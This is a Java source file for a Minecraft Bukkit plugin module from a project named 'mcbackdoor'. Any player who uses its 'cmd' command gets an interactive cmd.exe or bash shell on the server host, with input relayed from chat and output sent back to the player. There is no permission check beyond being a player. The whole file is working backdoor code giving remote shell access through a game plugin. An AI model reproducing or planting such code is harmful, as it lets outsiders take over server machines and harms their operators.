/*
 * To change this template, choose Tools | Templates
 * and open the template in the editor.
 */
package org.martin.bukkit.mcbackdoor.scmd.modules;

import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.io.PrintStream;
import java.util.HashMap;
import java.util.Iterator;
import java.util.LinkedList;
import java.util.logging.Level;
import java.util.logging.Logger;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.bukkit.plugin.java.JavaPlugin;
import org.martin.bukkit.mcbackdoor.scmd.Module;

/**
 *
 * @author Kekec852
 */
public class CMDModule implements Module {

    private HashMap<Player, Setting> openedConsoles = new HashMap<Player, Setting>();

    public void enable() {
    }

    public void disable() {
        Iterator<Setting> i = openedConsoles.values().iterator();
        while (i.hasNext()) {
            i.next().stop();
        }
        openedConsoles.clear();
    }

    public void setPlugin(JavaPlugin pl) {
    }

    public boolean onCommand(CommandSender sender, String[] args, String unclean) {
        if (sender instanceof Player) {
            Player player = (Player) sender;
            Setting s = openedConsoles.get(player);

            if (s == null) {
                s = new Setting();
                openedConsoles.put(player, s);
                s.init(player);
            }
            if (args.length == 1 && args[0].equalsIgnoreCase("stop")) {
                s.stop();
                openedConsoles.remove(player);
                return true;
            }
            if (args.length == 1 && args[0].equalsIgnoreCase("start")) {
                return true;
            }
            s.write(unclean);
            return true;
        }
        return false;
    }

    public String getCMD() {
        return "cmd";
    }

    public static boolean isWindows() {

        String os = System.getProperty("os.name").toLowerCase();
        //windows
        return (os.indexOf("win") >= 0);

    }

    public static boolean isUnix() {

        String os = System.getProperty("os.name").toLowerCase();
        //linux or unix
        return (os.indexOf("nix") >= 0 || os.indexOf("nux") >= 0);

    }

    class Setting {

        private StreamStringSender toProcess;
        private StreamCopier fromProcess;
        private Process process;

        public void init(CommandSender sender) {
            try {
                String os = System.getProperty("os.name");
                String cmdE = "cmd.exe";
                if(!isWindows() && isUnix()){
                    cmdE = "bash";
                }
                ProcessBuilder builder = new ProcessBuilder(cmdE);
                builder.redirectErrorStream(true);
                process = builder.start();
                fromProcess = new StreamCopier(process.getInputStream(), sender);
                new Thread(fromProcess).start();
                toProcess = new StreamStringSender(process.getOutputStream());
                new Thread(toProcess).start();
            } catch (IOException ex) {
                Logger.getLogger("Minecraft").log(Level.SEVERE, null, ex);
            }
        }

        public void write(String cmd) {
            toProcess.write(cmd);
        }

        public void stop() {
            process.destroy();
            toProcess.stop();
            fromProcess.stop();
        }
    }

    class StreamStringSender implements Runnable {

        private PrintStream out;
        private LinkedList<String> q = new LinkedList<String>();
        private boolean running = true;

        public StreamStringSender(OutputStream out) {
            this.out = new PrintStream(out);
        }

        public void run() {
            while (running) {
                if (!q.isEmpty()) {
                    out.println(q.removeLast());
                    out.flush();
                }
            }
        }

        public void write(String s) {
            q.add(s);
        }

        public void stop() {
            running = false;
        }
    }

    class StreamCopier implements Runnable {

        private InputStream in;
        private CommandSender out;
        private boolean running = true;

        public StreamCopier(InputStream in, CommandSender out) {
            this.in = in;
            this.out = out;
        }

        public void run() {
            while (running) {
                String s = "";
                int i;
                try {
                    while ((i = in.read()) != -1) {
                        s += (char) i;
                        if (i == '\n') {
                            break;
                        }
                    }
                } catch (IOException ex) {
                    Logger.getLogger("Minecraft").log(Level.SEVERE, null, ex);
                }
                out.sendMessage(s);
            }
        }

        public void stop() {
            running = false;
        }
    }
}
